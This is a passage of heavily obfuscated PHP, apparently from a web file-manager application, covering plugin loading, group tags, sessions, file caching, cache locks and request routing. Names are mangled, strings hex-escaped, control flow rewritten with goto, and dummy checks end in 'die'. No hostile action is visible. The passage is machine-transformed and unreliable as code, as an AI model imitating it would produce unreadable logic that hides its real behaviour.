write_log($ƒêš¿úÚ[1752] . $ÖÕï×Ê¿ . $ƒêš¿úÚ[71] . $¯ˆõ÷õ§[$ƒêš¿úÚ[264]] . $ƒêš¿úÚ[1753] . ACTION, $ƒêš¿úÚ[1744]); } catch (Exception $ÎÏ¤¤£Ä) { } continue; } $Ê‡¨ƒ•á[$ÖÕï×Ê¿] = $¯ˆõ÷õ§; } if (!$Â©«ÙÀ) { return; } if (!$Ê‡¨ƒ•á) { return Cache::remove($É‰ûšÖŞ); } Cache::set($É‰ûšÖŞ, $Ê‡¨ƒ•á, 60); Cache::removeMemory($É‰ûšÖŞ); } public static function finished($µ¹Õ‘Éñ, $¥˜ñÅ•Õ) { $¹Úá¸’õ =& $_SERVER[ïëó©ÒÚ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¹Úá¸’õ[264] => $µ¹Õ‘Éñ, $¹Úá¸’õ[1742] => $¥˜ñÅ•Õ); } private static function finishedRun() { $”ò÷Æ» =& $_SERVER[ïëó©ÒÚ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $›ûÀèÕä) { try { Hook::apply($›ûÀèÕä[$”ò÷Æ»[264]], $›ûÀèÕä[$”ò÷Æ»[1742]]); } catch (Exception $“ïÜ‹ÏÀ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto DÓ…È‰‡œ; Eø¤ˆä‹…: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($˜ÏŞÚ“°) { $ù²¸Õ´‹ =& $_SERVER[ïëó©ÒÚ]; return array($ù²¸Õ´‹[1942] => array($˜ÏŞÚ“°[0], $ù²¸Õ´‹[1943]), $ù²¸Õ´‹[1944] => array($˜ÏŞÚ“°[0], $ù²¸Õ´‹[1945])); } protected function get($ÃÀú›ùş) { $©üÛ÷¤Ÿ =& $_SERVER[ïëó©ÒÚ]; $¹ìÕ†öî = Model($©üÛ÷¤Ÿ[531])->metaGet($ÃÀú›ùş, $©üÛ÷¤Ÿ[1946]); $¤Î…ï©… = json_decode($¹ìÕ†öî, !0); return $¤Î…ï©… ? $¤Î…ï©… : array($©üÛ÷¤Ÿ[1947] => $©üÛ÷¤Ÿ[88], $©üÛ÷¤Ÿ[369] => array()); } protected function set($¯Á´îŸ¤, $Î×­¿²Š) { $º©à²³ =& $_SERVER[ïëó©ÒÚ]; $Î×­¿²Š = $Î×­¿²Š ? $Î×­¿²Š : array($º©à²³[1947] => $º©à²³[88], $º©à²³[369] => array()); return Model($º©à²³[531])->metaSet($¯Á´îŸ¤, $º©à²³[1946], json_encode($Î×­¿²Š)); } protected function getByTagID($Ë¦——, $©ïûŒ˜) { $æ©È‘ãñ =& $_SERVER[ïëó©ÒÚ]; if (!$Ë¦—— || !$©ïûŒ˜) { return !1; } if (!Model($æ©È‘ãñ[531])->getInfoSimple($Ë¦——)) { return !1; } $Íøƒî¯± = $this->get($Ë¦——); if (!$Íøƒî¯± || !isset($Íøƒî¯±[$æ©È‘ãñ[369]])) { return !1; } $¦Ì¶º˜ = array_find_by_field($Íøƒî¯±[$æ©È‘ãñ[369]], $æ©È‘ãñ[399], $©ïûŒ˜); return is_array($¦Ì¶º˜) ? $¦Ì¶º˜ : !1; } public function listSource($Ù·©…°ˆ, $£½¹ó´) { $€Äâı¥ =& $_SERVER[ïëó©ÒÚ]; if ($£½¹ó´ && !is_array($£½¹ó´)) { $£½¹ó´ = array($£½¹ó´); } $ü¿Á¯Ï = $this->listData($Ù·©…°ˆ); $èä²»‚ = array(); foreach ($ü¿Á¯Ï as $ş²ÃÍÈø) { $‡È¼‹¦ = $ş²ÃÍÈø[$€Äâı¥[84]]; if (!$‡È¼‹¦) { continue; } if (!isset($èä²»‚[$‡È¼‹¦])) { $èä²»‚[$‡È¼‹¦] = array(); } $èä²»‚[$‡È¼‹¦][] = $ş²ÃÍÈø[$€Äâı¥[435]]; } $’ƒ³õ±û = array(); foreach ($èä²»‚ as $‰£ÚÆœ => $ûÔ´³Ëè) { $øóØ‡×† = !0; if (!$£½¹ó´) { $’ƒ³õ±û[] = $‰£ÚÆœ; continue; } foreach ($£½¹ó´ as $öª‘İÅ¢) { if (!in_array($öª‘İÅ¢, $ûÔ´³Ëè)) { $øóØ‡×† = !1; break; } } if ($øóØ‡×†) { $’ƒ³õ±û[] = $‰£ÚÆœ; } } if (!$’ƒ³õ±û) { return array(); } $ç°œğ†Ø = array($€Äâı¥[426] => array($€Äâı¥[427], $’ƒ³õ±û), $€Äâı¥[514] => $Ù·©…°ˆ, $€Äâı¥[420] => SourceModel::TYPE_GROUP); $µÍ¸Ğ˜é = Model($€Äâı¥[1330])->listSource($ç°œğ†Ø); if (!$µÍ¸Ğ˜é || count($’ƒ³õ±û) == $µÍ¸Ğ˜é[$€Äâı¥[366]][$€Äâı¥[367]]) { return $µÍ¸Ğ˜é; } $¿–Ø÷§á = array(); $´ËË§¡” = array_to_keyvalue($µÍ¸Ğ˜é[$€Äâı¥[82]], $€Äâı¥[12], $€Äâı¥[411]); $¨í¾ìç§ = array_to_keyvalue($µÍ¸Ğ˜é[$€Äâı¥[83]], $€Äâı¥[12], $€Äâı¥[411]); $­Ï©„•û = array_merge($¨í¾ìç§, $´ËË§¡”); foreach ($’ƒ³õ±û as $‡È¼‹¦) { if (!in_array($‡È¼‹¦, $­Ï©„•û)) { $¿–Ø÷§á[] = $‡È¼‹¦; } } if ($¿–Ø÷§á) { $this->removeBySource($Ù·©…°ˆ, $¿–Ø÷§á); } return $µÍ¸Ğ˜é; } protected function listData($¥Ä²´˜Š) { $¶ ûšÑœ =& $_SERVER[ïëó©ÒÚ]; $¹¥ÉãÎ“ = array($¶ ûšÑœ[1652] => 0, $¶ ûšÑœ[493] => array($¶ ûšÑœ[1948], 0), $¶ ûšÑœ[431] => $¶ ûšÑœ[1949] . $¥Ä²´˜Š); $Ä­µ†Çª = $¶ ûšÑœ[1950]; $ß§æî¨è = $this->field($Ä­µ†Çª)->where($¹¥ÉãÎ“)->order($¶ ûšÑœ[1951])->select(); return $ß§æî¨è ? $ß§æî¨è : array(); } protected function addToTag($Ìª½åÍÁ, $§ĞÄàã, $´å‘×Ğì) { $°Åáî£Ì =& $_SERVER[ïëó©ÒÚ]; if (!$this->getByTagID($Ìª½åÍÁ, $´å‘×Ğì) || !$§ĞÄàã) { return !1; } if (!Model($°Åáî£Ì[835])->pathInfo($§ĞÄàã)) { return !1; } $ÈØìå¼ = array($°Åáî£Ì[1652] => 0, $°Åáî£Ì[493] => $´å‘×Ğì, $°Åáî£Ì[430] => $§ĞÄàã, $°Åáî£Ì[431] => $°Åáî£Ì[1952] . $Ìª½åÍÁ, $°Åáî£Ì[429] => $°Åáî£Ì[12], $°Åáî£Ì[1837] => 0); if ($this->where($ÈØìå¼)->find()) { return !1; } return $this->add($ÈØìå¼); } protected function removeFromTag($ÈâÊ€¹‚, $¢ÎÄáª, $š¬î…Á) { $•ÀÌ©—İ =& $_SERVER[ïëó©ÒÚ]; if (!$this->getByTagID($ÈâÊ€¹‚, $š¬î…Á) || !$¢ÎÄáª) { return !1; } if (is_array($¢ÎÄáª)) { $¢ÎÄáª = array($•ÀÌ©—İ[7], $¢ÎÄáª); } $„Ïú”Ù = array($•ÀÌ©—İ[1652] => 0, $•ÀÌ©—İ[493] => $š¬î…Á, $•ÀÌ©—İ[431] => $•ÀÌ©—İ[1952] . $ÈâÊ€¹‚, $•ÀÌ©—İ[430] => $¢ÎÄáª); return $this->where($„Ïú”Ù)->delete(); } protected function removeByTag($šÏ¼ ¢, $ú°Üé„) { $ß£Òäˆ =& $_SERVER[ïëó©ÒÚ]; if (!$this->getByTagID($šÏ¼ ¢, $ú°Üé„)) { return !1; } $°è¦×¯‡ = array($ß£Òäˆ[1652] => 0, $ß£Òäˆ[493] => $ú°Üé„, $ß£Òäˆ[431] => $ß£Òäˆ[1952] . $šÏ¼ ¢); return $this->where($°è¦×¯‡)->delete(); } protected function removeBySource($¿ØÅåú¡, $¯ğšá‚©) { $³¿±ÌÙ– =& $_SERVER[ïëó©ÒÚ]; if (!$¿ØÅåú¡ || !$¯ğšá‚©) { return !1; } if (is_array($¯ğšá‚©)) { $¯ğšá‚© = array($³¿±ÌÙ–[7], $¯ğšá‚©); } $ÒÚõ·ŞÀ = array($³¿±ÌÙ–[1652] => 0, $³¿±ÌÙ–[430] => $¯ğšá‚©, $³¿±ÌÙ–[493] => array($³¿±ÌÙ–[1017], 0), $³¿±ÌÙ–[431] => $³¿±ÌÙ–[1952] . $¿ØÅåú¡); return $this->where($ÒÚõ·ŞÀ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\160\154\165\147\151\156\x4c\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\163\x74\x61\x74\x75\x73", "\162\145\x67\x69\145\x73\x74", "\x63\157\156\146\x69\147"); public function loadList($¶²€È­ = false) { $Õ‡¼ºì = array_to_keyvalue($this->listData(), $_SERVER[ïëó©ÒÚ][32]); if ($¶²€È­) { return $Õ‡¼ºì[$¶²€È­]; } return $Õ‡¼ºì; } public function init() { $û–ô¬‰‚ =& $_SERVER[ïëó©ÒÚ]; Hook::trigger($û–ô¬‰‚[1953]); $©ëô¶½ç = $this->loadPluginList(); foreach ($©ëô¶½ç as $Çºú‘åù => $’©™İÆş) { $ßĞ‡œê‡ = $this->appAllow($Çºú‘åù, $’©™İÆş); if (!$ßĞ‡œê‡) { continue; } foreach ($’©™İÆş[$û–ô¬‰‚[1954]] as $ŞÒ–Ş™× => $£şÓ†“) { Hook::bind($ŞÒ–Ş™×, $£şÓ†“); } } Hook::trigger($û–ô¬‰‚[1955]); Hook::trigger(ACTION); } public function appAllow($ƒ÷î™Â, $Æ©Åª›Ê, $¼‰ôÛ¨ = true) { $ßïÜ¶Æï =& $_SERVER[ïëó©ÒÚ]; $’îÉÓˆ = PLUGIN_DIR . $ƒ÷î™Â . $ßïÜ¶Æï[1956]; if (!is_array($Æ©Åª›Ê) || !is_array($Æ©Åª›Ê[$ßïÜ¶Æï[1954]]) || $Æ©Åª›Ê[$ßïÜ¶Æï[760]] != 1 || !is_file($’îÉÓˆ)) { return !1; } if ($GLOBALS[$ßïÜ¶Æï[512]] == 1) { if ($GLOBALS[$ßïÜ¶Æï[6]][$ßïÜ¶Æï[1957]] || !$GLOBALS[$ßïÜ¶Æï[6]][$ßïÜ¶Æï[1958]]) { return !0; } $“‰³í²ü = explode($ßïÜ¶Æï[50], strtolower($GLOBALS[$ßïÜ¶Æï[6]][$ßïÜ¶Æï[1958]])); return in_array(strtolower($ƒ÷î™Â), $“‰³í²ü) ? !1 : !0; } if ($¼‰ôÛ¨ && !Action($ßïÜ¶Æï[1959])->checkAuth($ƒ÷î™Â)) { return !1; } return !0; } public function unInstall($®‹ Ì˜) { $é¢‹®©á =& $_SERVER[ïëó©ÒÚ]; $¾ÃúËÉ‹ = $this->loadList($®‹ Ì˜); if (file_exists(PLUGIN_DIR . $®‹ Ì˜)) { Hook::apply($®‹ Ì˜ . $é¢‹®©á[1960]); } $this->remove($¾ÃúËÉ‹[$é¢‹®©á[399]]); } public function changeStatus($İ¨…ÒÙÊ, $ïÃ±¾¨ø) { $ş¸üÖƒÖ =& $_SERVER[ïëó©ÒÚ]; $é”óÑœœ = $this->loadList($İ¨…ÒÙÊ); if ($ïÃ±¾¨ø) { Hook::apply($İ¨…ÒÙÊ . $ş¸üÖƒÖ[1961]); } $this->update($é”óÑœœ[$ş¸üÖƒÖ[399]], array($ş¸üÖƒÖ[1962] => $ïÃ±¾¨ø)); } public function appRegist($«¡ûù¸‡, $ÏÍË¾â) { $¬õë´ßâ =& $_SERVER[ïëó©ÒÚ]; $äó‰ú™ = $this->loadList($«¡ûù¸‡); if ($äó‰ú™) { $this->update($äó‰ú™[$¬õë´ßâ[399]], array($¬õë´ßâ[1954] => $ÏÍË¾â)); } else { $»¢ÂÓ’á = array($¬õë´ßâ[32] => $«¡ûù¸‡, $¬õë´ßâ[1954] => $ÏÍË¾â, $¬õë´ßâ[760] => 0, $¬õë´ßâ[6] => $this->getConfigDefault($«¡ûù¸‡)); $this->insert($»¢ÂÓ’á); } } public function getConfigDefault($®¶Ïû¾¿) { $Àõ…àş¿ =& $_SERVER[ïëó©ÒÚ]; $ëÑÃ²…¾ = array(); $¾¸³ö‘É = $this->getPackageJson($®¶Ïû¾¿); if (!$¾¸³ö‘É && is_array($¾¸³ö‘É[$Àõ…àş¿[1963]])) { return $ëÑÃ²…¾; } foreach ($¾¸³ö‘É[$Àõ…àş¿[1963]] as $êƒ•ô³ => $éÜ„°’) { if (!isset($éÜ„°’[$Àõ…àş¿[374]]) || isset($ëÑÃ²…¾[$êƒ•ô³])) { continue; } $ëÑÃ²…¾[$êƒ•ô³] = $éÜ„°’[$Àõ…àş¿[374]]; } return $ëÑÃ²…¾; } public function getPackageJson($™çºš»µ) { return Hook::apply($™çºš»µ . $_SERVER[ïëó©ÒÚ][1964]); } public function getConfig($ÇŒÚÖš, $ˆ£¹ö×É = false) { $êÒÍà¯¿ =& $_SERVER[ïëó©ÒÚ]; $ÇÍ¦È§ = array(); $ß¼²şÇ› = $this->loadList($ÇŒÚÖš); if ($ß¼²şÇ› && is_array($ß¼²şÇ›[$êÒÍà¯¿[6]])) { $ÇÍ¦È§ = $ß¼²şÇ›[$êÒÍà¯¿[6]]; } if (!$ÇÍ¦È§ || $ˆ£¹ö×É) { $ÇÍ¦È§ = $this->getConfigDefault($ÇŒÚÖš); } return $ÇÍ¦È§; } public function setConfig($¿çÃöÀ, $˜¿ŞÛâ = false) { $¡âà¾† =& $_SERVER[ïëó©ÒÚ]; $ßÌíáŒœ = $this->loadList($¿çÃöÀ); if (!$ßÌíáŒœ) { return !1; } $öÛËûŸÊ = $ßÌíáŒœ[$¡âà¾†[6]]; if ($˜¿ŞÛâ == !1) { $öÛËûŸÊ = array(); $˜¿ŞÛâ = $this->getConfigDefault($¿çÃöÀ); } foreach ($˜¿ŞÛâ as $¨™Ùø€Å => $™¼¸î) { $öÛËûŸÊ[$¨™Ùø€Å] = is_string($™¼¸î) ? trim($™¼¸î) : $™¼¸î; } $this->update($ßÌíáŒœ[$¡âà¾†[399]], array($¡âà¾†[6] => $öÛËûŸÊ)); } public function viewList() { $¦Œ£œìÉ =& $_SERVER[ïëó©ÒÚ]; $áÜÓÌµÔ = $this->loadList(); $this->pluginScan($áÜÓÌµÔ); $áÜÓÌµÔ = $this->loadPluginList(); $‹ŞãĞ•¶ = array(); foreach ($áÜÓÌµÔ as $‹‚‘œÑ’ => $âíŠ´¥‘) { unset($âíŠ´¥‘[$¦Œ£œìÉ[1954]], $âíŠ´¥‘[$¦Œ£œìÉ[6]]); $ÀŠ¿ŒŸ = PLUGIN_DIR . $âíŠ´¥‘[$¦Œ£œìÉ[32]] . $¦Œ£œìÉ[1956]; if (!is_file($ÀŠ¿ŒŸ)) { continue; } $¶óŸéêè = Hook::apply($âíŠ´¥‘[$¦Œ£œìÉ[32]] . $¦Œ£œìÉ[1964]); if (is_array($¶óŸéêè)) { $‹ŞãĞ•¶[$‹‚‘œÑ’] = array_merge($âíŠ´¥‘, $¶óŸéêè); } } return $‹ŞãĞ•¶; } private function loadPluginList() { $§ÍóŠ×ä =& $_SERVER[ïëó©ÒÚ]; $â©”Ç€© = $this->loadList(); if (strtolower(MOD) == $§ÍóŠ×ä[1965]) { return $â©”Ç€©; } $““øÇşÛ = Hook::trigger($§ÍóŠ×ä[1966], $â©”Ç€©); if ($â©”Ç€© && !$““øÇşÛ) { die; } return $““øÇşÛ ? $““øÇşÛ : $â©”Ç€©; } private function pluginScan($÷¾›ºÙ) { $ÕƒÅæŒ =& $_SERVER[ïëó©ÒÚ]; recursion_dir(PLUGIN_DIR, $†ÉìÙ§, $˜´é³ì¹, 0); foreach ($†ÉìÙ§ as $½ò‚Ó) { $ûÀÓÈÇ” = get_path_this($½ò‚Ó); if (isset($÷¾›ºÙ[$ûÀÓÈÇ”]) || !file_exists($½ò‚Ó . $ÕƒÅæŒ[1967]) || !file_exists($½ò‚Ó . $ÕƒÅæŒ[1956])) { continue; } Hook::apply($ûÀÓÈÇ” . $ÕƒÅæŒ[1961]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\155\x5f\x73\145\163\163\151\x6f\156"; public function get($ºşöõî³) { $ÚñàãÅÌ =& $_SERVER[ïëó©ÒÚ]; $ã‰ è¸ = $this->where(array($ÚñàãÅÌ[1968] => $ºşöõî³))->find(); if (!is_array($ã‰ è¸)) { return !1; } return $ã‰ è¸[$ÚñàãÅÌ[765]]; } public function set($º™ùöØÓ, $ ¾¤ÉÁ™, $½ğòÄÁ = 3600) { $ÕÎÖ§áì =& $_SERVER[ïëó©ÒÚ]; $ÚØèŸ¨Á = array($ÕÎÖ§áì[1968] => $º™ùöØÓ, $ÕÎÖ§áì[1872] => $ ¾¤ÉÁ™, $ÕÎÖ§áì[1969] => $½ğòÄÁ + time()); if (Session::get($ÕÎÖ§áì[1970])) { $ÚØèŸ¨Á[$ÕÎÖ§áì[1661]] = Session::get($ÕÎÖ§áì[1970]); } else { $ÚØèŸ¨Á[$ÕÎÖ§áì[1661]] = 0; } if ($this->get($º™ùöØÓ)) { return $this->where(array($ÕÎÖ§áì[1968] => $º™ùöØÓ))->save($ÚØèŸ¨Á); } else { return $this->add($ÚØèŸ¨Á, array(), !0); } } public function remove($ÏŒÀ’ê¬) { return $this->where(array($_SERVER[ïëó©ÒÚ][1968] => $ÏŒÀ’ê¬))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ïëó©ÒÚ][1971] . time())->delete(); } } goto a™±´„Ì§¬; Dô¹‡Ğ¦»˜: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ğı°ÆıÊ, $Ê˜×ÆÍÆ) { $øà¤Å¾µ =& $_SERVER[ïëó©ÒÚ]; $this->cachePath = $ğı°ÆıÊ[$øà¤Å¾µ[84]]; $this->prefix = $øà¤Å¾µ[844]; $this->cacheTime = $Ê˜×ÆÍÆ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ğĞŠ÷àí) { $”ú•ª™  =& $_SERVER[ïëó©ÒÚ]; $ğĞŠ÷àí = str_replace(array($”ú•ª™ [845], $”ú•ª™ [97], $”ú•ª™ [73]), $”ú•ª™ [846], $ğĞŠ÷àí); return $this->cachePath . $”ú•ª™ [847] . $ğĞŠ÷àí . $”ú•ª™ [848]; } public function set($¸¤¦Ê¥ß, $ÉÙˆ†Æí, $Š¥ú¸öí = false) { $ı Éùøü = $this->getFile($¸¤¦Ê¥ß); if (file_put_contents($ı Éùøü, $this->prefix . $ÉÙˆ†Æí, LOCK_EX)) { @touch($ı Éùøü, intval(time() + $Š¥ú¸öí)); clearstatcache(); return !0; } @unlink($ı Éùøü); return !1; } public function get($õ®¬ûú…) { $†ª™ùü“ = $this->getFile($õ®¬ûú…); if (file_exists($†ª™ùü“) && filemtime($†ª™ùü“) < time()) { @unlink($†ª™ùü“); return !1; } $Áşı›Û² = @file_get_contents($†ª™ùü“); return substr($Áşı›Û², strlen($this->prefix)); } public function remove($Îïßı­“) { $ÏÎ¦îÍ = $this->getFile($Îïßı­“); return @unlink($ÏÎ¦îÍ); } public function deleteAll() { $É•Úòƒ› =& $_SERVER[ïëó©ÒÚ]; $Şà³ÛÒÖ = scandir($this->cachePath); foreach ($Şà³ÛÒÖ as $„Ü—ô¶Õ) { $™¹¾«ìù = $this->cachePath . $„Ü—ô¶Õ; if (strpos($™¹¾«ìù, $É•Úòƒ›[848]) && strpos($™¹¾«ìù, $É•Úòƒ›[849])) { @unlink($™¹¾«ìù); } } } public function clearTimeout() { $È¦¨¾øé =& $_SERVER[ïëó©ÒÚ]; $¶®±ÙÛÕ = scandir($this->cachePath); foreach ($¶®±ÙÛÕ as $¨œ‘“Âô) { $ùøÖ¡©û = $this->cachePath . $¨œ‘“Âô; if (strpos($ùøÖ¡©û, $È¦¨¾øé[848]) && strpos($ùøÖ¡©û, $È¦¨¾øé[849]) && filemtime($ùøÖ¡©û) < time()) { @unlink($ùøÖ¡©û); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $·¿²çÌ§ =& $_SERVER[ïëó©ÒÚ]; if (self::$handle) { return self::$handle; } $’áåš© = $GLOBALS[$·¿²çÌ§[6]][$·¿²çÌ§[349]]; self::$timeout = $’áåš©[$·¿²çÌ§[850]] ? $’áåš©[$·¿²çÌ§[850]] : 10; $°Ø»•Ì = _get($GLOBALS[$·¿²çÌ§[6]], $·¿²çÌ§[851]); $›óÏ¸‹ş = $’áåš©[$·¿²çÌ§[837]] ? $’áåš©[$·¿²çÌ§[837]] : $·¿²çÌ§[199]; if ($›óÏ¸‹ş == $·¿²çÌ§[21] && $°Ø»•Ì == $·¿²çÌ§[13]) { $›óÏ¸‹ş = $·¿²çÌ§[199]; } switch ($›óÏ¸‹ş) { case $·¿²çÌ§[840]: self::$handle = new CacheLockRedis(); break; case $·¿²çÌ§[841]: self::$handle = new CacheLockMemcached(); break; case $·¿²çÌ§[21]: self::$handle = new CacheLockDatabase(); break; case $·¿²çÌ§[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($·¿²çÌ§[852], $·¿²çÌ§[853]); } return self::$handle; } private static function key($ø¥ç“¾Ù) { return $_SERVER[ïëó©ÒÚ][854] . Cache::key($ø¥ç“¾Ù); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($÷úÃ°è¾ = '') { self::$errorMsg = $÷úÃ°è¾; } public static function lockGlobal($‘½ÈéşÀ, $±¼Ó†Ù–) { return self::lock($‘½ÈéşÀ, $±¼Ó†Ù–, !0); } public static function lock($ã»Ùå£©, $ùÏ›ñ» = false, $™Ó¹×ï = false) { $À£üşõ =& $_SERVER[ïëó©ÒÚ]; $¦‹Ş¹®Ñ = self::init(); $úĞˆÜ¶Å = self::key($ã»Ùå£©); $ùÏ›ñ» = $ùÏ›ñ» ? $ùÏ›ñ» : self::$timeout; $í­íîéÈ = $¦‹Ş¹®Ñ->lock($úĞˆÜ¶Å, $ùÏ›ñ»); $˜ÓÓÄù’ = timeFloat(); if (!$í­íîéÈ) { $êéİ‡´ = "\x6c\x6f\143\153\40\145\x72\162\157\162\73\153\145\171\x3d{$ã»Ùå£©}\73\164\151\x6d\145\75{$ùÏ›ñ»}\73" . self::$errorMsg . $À£üşõ[71] . get_caller_msg(); $‚ˆÚÀ¿¿ = LNG($À£üşõ[855]) . "\50{$ùÏ›ñ»}\x73\x29\56" . LNG($À£üşõ[856]); $‚ˆÚÀ¿¿ .= $À£üşõ[857]; if (is_string(self::$errorMsg) && self::$errorMsg) { $‚ˆÚÀ¿¿ = $‚ˆÚÀ¿¿ . $À£üşõ[858] . self::$errorMsg; } write_log($êéİ‡´, $À£üşõ[853]); show_json($‚ˆÚÀ¿¿, !1); } if (!$™Ó¹×ï) { self::$lockItem[$úĞˆÜ¶Å] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ˆùäü§” = number_format(timeFloat() - $˜ÓÓÄù’, 3); write_log($À£üşõ[859] . $ã»Ùå£© . $À£üşõ[860] . $ˆùäü§”, $À£üşõ[853]); } return $í­íîéÈ; } public static function lockGet($è« îƒ) { $ºÚËœ©û = self::key($è« îƒ); if (self::$lockItem[$ºÚËœ©û]) { return self::$lockItem[$ºÚËœ©û]; } return self::init()->lockGet($ºÚËœ©û); } public static function unlock($ñ®Ç„üã) { $“›à‘—… =& $_SERVER[ïëó©ÒÚ]; $Ÿ¾ÀÕ¯¨ = self::key($ñ®Ç„üã); self::$lockItem[$Ÿ¾ÀÕ¯¨] = null; self::init()->unlock($Ÿ¾ÀÕ¯¨); if (GLOBAL_DEBUG_LOG_ALL) { write_log($“›à‘—…[861] . $ñ®Ç„üã, $“›à‘—…[853]); } return; } public static function unlockRuntime() { $Ş¸•°İ =& $_SERVER[ïëó©ÒÚ]; $–Ã—ĞÊ = self::init(); $â±İà£­ = !1; foreach (self::$lockItem as $•ü¦¦•Ì => $îµïÛ¬) { if (!$îµïÛ¬) { continue; } $–Ã—ĞÊ->unlock($•ü¦¦•Ì); if (!$â±İà£­) { $â±İà£­ = !0; write_log($Ş¸•°İ[862] . $•ü¦¦•Ì . $Ş¸•°İ[71] . get_caller_msg(), $Ş¸•°İ[853]); continue; } write_log($Ş¸•°İ[862] . $•ü¦¦•Ì, $Ş¸•°İ[853]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $“®€–Æï = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Ş¸•°İ[863] . $“®€–Æï . $Ş¸•°İ[864] . ACTION, $Ş¸•°İ[853]); } } public static function fileLock($®Ôı¢„¯) { $óœû›” =& $_SERVER[ïëó©ÒÚ]; if (!$GLOBALS[$óœû›”[865]]) { $GLOBALS[$óœû›”[865]] = array(); } $GLOBALS[$óœû›”[865]][$®Ôı¢„¯] = !1; $ÇÇ¹ÈÒ± = fopen(DATA_PATH . $®Ôı¢„¯ . $óœû›”[866], $óœû›”[867]); if (!$ÇÇ¹ÈÒ±) { return !1; } $GLOBALS[$óœû›”[865]][$®Ôı¢„¯] = $ÇÇ¹ÈÒ±; if (flock($ÇÇ¹ÈÒ±, LOCK_EX)) { return !0; } self::unlock($®Ôı¢„¯); show_json($óœû›”[868], !1); return !1; } public static function fileUnlock($Æ¬İ­÷š) { $®±øĞÌÙ =& $_SERVER[ïëó©ÒÚ]; $µşÉÃ‡ã = $GLOBALS[$®±øĞÌÙ[865]][$Æ¬İ­÷š]; if (!$µşÉÃ‡ã) { return; } $GLOBALS[$®±øĞÌÙ[865]][$Æ¬İ­÷š] = !1; flock($µşÉÃ‡ã, LOCK_UN); fclose($µşÉÃ‡ã); } public static function fileUnlockAll() { $Öìóèƒ =& $_SERVER[ïëó©ÒÚ]; if (!$GLOBALS[$Öìóèƒ[865]]) { return; } foreach ($GLOBALS[$Öìóèƒ[865]] as $ÏÔÓÂĞ => $¿ªã×ëç) { if (!$¿ªã×ëç) { continue; } $GLOBALS[$Öìóèƒ[865]][$ÏÔÓÂĞ] = !1; flock($¿ªã×ëç, LOCK_UN); fclose($¿ªã×ëç); } $GLOBALS[$Öìóèƒ[865]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto EÜâ¬íğÃ¦; eÙ£“Î„İ†: class Application { private $defaultModule = "\x69\x6e\144\145\170"; private $defaultController = "\x69\x6e\144\145\x78"; private $defaultAction = "\x69\x6e\144\145\170"; function __construct() { } public function setDefault($÷¶Î¢ïŒ) { $§æ¤ ° =& $_SERVER[ïëó©ÒÚ]; $¯§É©Áİ =& $_SERVER[•×è•É]; $†œˆ÷ˆ¦ = explode($¯§É©Áİ[0], trim($÷¶Î¢ïŒ, $¯§É©Áİ[0])); $·„¥ßÈÛ = $§æ¤ °[627]; while (strlen($·„¥ßÈÛ) < $§æ¤ °[628]) { if (!$·„¥ßÈÛ) { break; } $·„¥ßÈÛ++; } $this->defaultModule = $†œˆ÷ˆ¦[0] ? $†œˆ÷ˆ¦[0] : $this->defaultModule; $this->defaultController = $†œˆ÷ˆ¦[1] ? $†œˆ÷ˆ¦[1] : $this->defaultController; $œ¶ğóèƒ = $§æ¤ °[629]; if (!$œ¶ğóèƒ) { die; } $this->defaultAction = $†œˆ÷ˆ¦[2] ? $†œˆ÷ˆ¦[2] : $this->defaultAction; $this->nxcm006ff05c($¯§É©Áİ[1], array($this, $¯§É©Áİ[2])); $ùëáŒ£ó = $§æ¤ °[630]; if (strlen($ùëáŒ£ó) < $§æ¤ °[631]) { die; } } public function appRun($¼ÙÅ›¨Œ) { $ÁÊ”ÂŒí =& $_SERVER[ïëó©ÒÚ]; $ÆÆ½Ï»Ç =& $_SERVER[•×è•É]; $ÒÄààû  = explode($ÆÆ½Ï»Ç[0], $¼ÙÅ›¨Œ); $–÷Ê¹ıÜ = $ÁÊ”ÂŒí[632]; if (!$–÷Ê¹ıÜ) { die; } $à®Èéˆâ = strtolower($ÒÄààû [0]); $ì®êóªµ = $ÁÊ”ÂŒí[633]; while (strlen($ì®êóªµ) < $ÁÊ”ÂŒí[631]) { if (!$ì®êóªµ) { break; } $ì®êóªµ++; } $Úí†Äõ• = $ÆÆ½Ï»Ç[3]; $øßàœÈ´ = $ÁÊ”ÂŒí[634]; if ($à®Èéˆâ == $ÆÆ½Ï»Ç[4]) { $Úí†Äõ• = $ÆÆ½Ï»Ç[5]; $ÒÄààû [0] = $ÆÆ½Ï»Ç[6]; $ÒÄààû [1] = $ÒÄààû [1] . $ÆÆ½Ï»Ç[7]; $¼ÙÅ›¨Œ = join($ÆÆ½Ï»Ç[0], $ÒÄààû ); $¼ÙÅ›¨Œ = trim($¼ÙÅ›¨Œ, $ÆÆ½Ï»Ç[0]); } call_user_func(array($ÆÆ½Ï»Ç[8], $ÆÆ½Ï»Ç[9]), $Úí†Äõ• . $ÆÆ½Ï»Ç[10], $¼ÙÅ›¨Œ); ActionCall($¼ÙÅ›¨Œ); call_user_func(array($ÆÆ½Ï»Ç[8], $ÆÆ½Ï»Ç[9]), $Úí†Äõ• . $ÆÆ½Ï»Ç[11], $¼ÙÅ›¨Œ); } private function autorun() { $ÊÏØİ =& $_SERVER[•×è•É]; global $config; if (count($config[$ÊÏØİ[12]]) == 0) { return; } foreach ($config[$ÊÏØİ[12]] as $Ë§ËµØ => $ÜöÃ¸Ñ¢) { $this->appRun($ÜöÃ¸Ñ¢); } } private function cvpbfa8cf4ac() { 